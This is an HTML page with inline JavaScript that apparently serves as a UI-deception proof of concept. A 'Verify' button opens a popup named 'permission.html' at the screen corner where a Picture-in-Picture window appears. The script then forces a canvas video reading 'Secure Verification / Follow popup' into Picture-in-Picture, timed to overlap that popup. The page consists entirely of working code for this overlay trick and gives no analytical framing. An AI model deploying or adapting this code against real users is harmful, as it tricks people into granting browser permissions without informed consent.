<!DOCTYPE html>
<html>
<body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;">

<button onclick="start()">Verify</button>
<video id="vid" playsinline muted></video>

<script>
async function start() {
  const width = 320;
  const height = 180;

  // 🔥 Calculate bottom-right position
  const left = screen.availWidth - width - 50;
  const top = screen.availHeight - height - 80;

  // ✅ Open popup where PiP will likely appear
  const popup = window.open(
    "permission.html",
    "perm",
    `width=${width},height=${height},left=${left},top=${top}`
  );

  const video = document.getElementById("vid");

  const canvas = document.createElement("canvas");
  canvas.width = 320;
  canvas.height = 180;
  const ctx = canvas.getContext("2d");

  function draw() {
    ctx.fillStyle = "#fff";
    ctx.fillRect(0, 0, 320, 180);

    ctx.fillStyle = "#000";
    ctx.font = "16px Arial";
    ctx.fillText("Secure Verification", 60, 70);
    ctx.fillText("Follow popup", 80, 100);
  }

  draw();

  const stream = canvas.captureStream(30);
  video.srcObject = stream;

  // 🔥 Slight delay to sync visual overlap
  setTimeout(async () => {
    try {
      await video.play();
      await video.requestPictureInPicture();
    } catch (e) {
      console.log(e);
    }
  }, 200);
}
</script>

</body>
</html>
